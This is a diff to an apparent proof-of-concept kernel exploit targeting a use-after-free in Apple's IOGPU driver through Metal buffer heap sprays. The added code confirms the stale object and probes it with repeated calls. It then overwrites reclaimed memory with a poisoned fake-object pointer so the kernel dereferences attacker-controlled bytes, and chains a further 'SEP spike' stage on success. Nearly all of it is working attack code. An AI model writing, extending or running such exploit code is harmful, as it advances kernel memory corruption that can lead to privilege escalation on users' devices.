@@ -354,8 +354,8 @@ static uint32_t plant_uaf(id<MTLDevice> dev, io_connect_t conn) {
 }
 
 /* ── Confirm UAF: set_resource_purgeable on stale_id after spray ──────── */
-static void confirm_uaf(io_connect_t conn, uint32_t stale_id,
-                        NSArray<id<MTLBuffer>> *spray) {
+static int confirm_uaf(io_connect_t conn, uint32_t stale_id,
+                       NSArray<id<MTLBuffer>> *spray) {
     (void)spray; /* retained by caller; its heap memory is in the freed slot */
 
     kern_return_t kr = g_trap2(conn, 3, stale_id, 0);
@@ -367,11 +367,60 @@ static void confirm_uaf(io_connect_t conn, uint32_t stale_id,
         printf("  Call1 fired: ldaddl on spray[0x24] (was 0, now -4)\n");
         printf("  Call2 skipped: old spray[0x24] was 0\n");
         printf("  Call3 skipped: spray[0x10] = 0\n");
+        nk_log("[iogpu-uaf][stage2] confirm 0xe0002be stale_id=%u", stale_id);
+        return 1;
     } else if (kr == (kern_return_t)0xe00002c2) {
         printf("[-] resource not found — spray may not have reclaimed the slot\n");
         printf("    Try increasing SPRAY_COUNT or adjusting spray timing\n");
     } else {
         printf("[?] kr=0x%x — unexpected response\n", kr);
+    }
+    return 0;
+}
+
+/* ── STAGE 2 — burst discriminators + refcount-side write demo ─────────────
+ * Post-confirm (kr==0xe0002be) the corpse fields ARE in attacker memory:
+ * static IOGPUSysMemory targets [stale+0x10] (call3 object ptr),
+ * [stale+0x24] (ldaddl refcount -4/call), [stale+0x28] (call 2 ptr).
+ * Burst A: histogram of 256 purgible calls on the same ID — every distinct
+ *   signal (incl. the counter-dominated path dying after N calls) is the
+ *   read discriminant of the ldaddl burnout.
+ * Burst B: re-spray with a poisoned +0x10 fake-object pointer (0xFFFFFFFF
+ *   filled) — the next call on the live ID dereferences OUR bytes; the
+ *   resulting kernel fault carries our data in the frame = offset truth. */
+static void uaf_stage2(id<MTLDevice> dev, io_connect_t conn, uint32_t stale_id,
+                       NSArray<id<MTLBuffer>> *old_spray) {
+    printf("\n=== STAGE 2: burst discriminators ===\n");
+    nk_log("[uaf-stage2] burst A start stale_id=%u", stale_id);
+
+    kern_return_t seen[8];
+    uint32_t cnt[8];
+    unsigned cls = 0, misses = 0;
+    for (uint32_t i = 0; i < 256; i++) {
+        kern_return_t kr = g_trap2(conn, 3, stale_id, 0);
+        unsigned k;
+        for (k = 0; k < cls; k++) if (kr == seen[k]) break;
+        if (k < 8 && k == cls) { seen[cls] = kr; cnt[cls] = 0; cls++; }
+        if (k < cls) cnt[k]++; else misses++;
+    }
+    for (unsigned k = 0; k < cls; k++) {
+        printf("[stage2] kr=%#010x × %u\n", seen[k], cnt[k]);
+        nk_log("[uaf-stage2] burst kr=0x%x times=%u", seen[k], cnt[k]);
+    }
+    nk_log("[uaf-stage2] burst done cls=%u", cls);
+
+    /* Burst B: poison the +0x10 object pointer across the reclaiming spray,
+       one purgible call, log whatever comes back (kernel frame shows our
+       poison if the deref is live on this build). */
+    if (old_spray.count > 0) {
+        for (id<MTLBuffer> b in old_spray) {
+            if (b.contents) memset(b.contents, 0xFF, SPRAY_SZ);
+        }
+        nk_log("[uaf-stage2] burst B: +0x10 poisoned, firing one call");
+        printf("[stage2] burst B: +0x10 = 0xFFFFFFFFFFFFFFFF, one call...\n");
+        kern_return_t kr = g_trap2(conn, 3, stale_id, 0);
+        printf("[stage2] burst B kr=0x%x\n", kr);
+        nk_log("[uaf-stage2] burst B kr=0x%x", kr);
     }
 }
 
@@ -425,10 +474,19 @@ int poc_iogpu_uaf_run(void) {
            stale_id, SPRAY_COUNT);
     NSArray *spray = spray_buffers(dev);
 
-    confirm_uaf(conn, stale_id, spray);
+    int live = confirm_uaf(conn, stale_id, spray);
+    if (live) {
+        uaf_stage2(dev, conn, stale_id, spray);
+        /* SEP spike only on a live UAF — the session file is open, the
+           spike's dtrace/sep probe output lands in Documents. */
+        nk_log("[iogpu-uaf] live uaf → running SEP spike");
+        printf("[stage2] running SEP spike...\n");
+        int sepr = nk_t0e_spike();
+        nk_log("[iogpu-uaf] sep spike rc=%d", sepr);
+    }
 
     printf("\n=== PoC complete ===\n");
-    return 0;
+    return live ? 2 : 0;
 }
 
 
